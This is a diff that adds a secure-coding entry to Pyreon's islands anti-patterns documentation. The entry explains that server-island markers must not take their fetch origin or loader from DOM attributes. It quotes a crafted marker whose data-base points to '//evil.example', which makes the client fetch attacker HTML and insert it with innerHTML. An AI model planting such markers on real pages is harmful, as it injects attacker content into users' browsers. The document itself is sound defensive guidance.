@@ -5,6 +5,12 @@ description: "Common islands mistakes in Pyreon and how to fix them."
 
 > **Generated** from `.agents/rules/anti-patterns.md` (the same source as MCP `get_anti_patterns`). Each entry is a real mistake + its fix; where a detector code is listed, the linter / `pyreon doctor` / MCP `validate` catches it automatically.
 
+### A DOM attribute must never choose the origin or path of something inserted as HTML or imported as code.
+
+Markup that reaches a page (anything a sanitizer lets through with custom elements and `data-*`) can plant a marker, so an attribute the runtime reads back is attacker input. A server-island marker read its fragment base from `data-base`: `<pyreon-server-island data-name="x" data-base="//evil.example">` fetched `//evil.example/_pyreon/fragment/x` (that server only needs `Access-Control-Allow-Origin: *`) and inserted the response with `innerHTML` (#4768 review). Rules: the base/origin comes from code (the component's router read in its body, an explicit argument, `setServerIslandBase` with zero's build constant), never from the DOM; a value that becomes a URL path is validated (`isRoutePath` in `@pyreon/server`; a name that becomes a path segment is a plain identifier, never `..`); the final URL is resolved against `location.origin` and refused unless same-origin; page-supplied values may only become encoded query values the same-origin endpoint verifies. The same class for code: `data-component` picks a loader with `Object.hasOwn(registry, id)`, never `registry[id]` (an inherited `constructor`/`toString` would be called as a loader). Reference: `server/src/server-island.ts:activateServerIslandElement` (threat model), `server/src/client.ts` (`hydrateIslands`); locked by `server-island-client.test.tsx` ("a crafted marker cannot steer the fragment request") and `client.test.ts` (inherited `data-component`).
+
+---
+
 ### Importing `island` from the `@pyreon/server` main barrel into client/route code
 
 Import from `@pyreon/server/client` in any file that ships to the client (every `@pyreon/zero` route does).
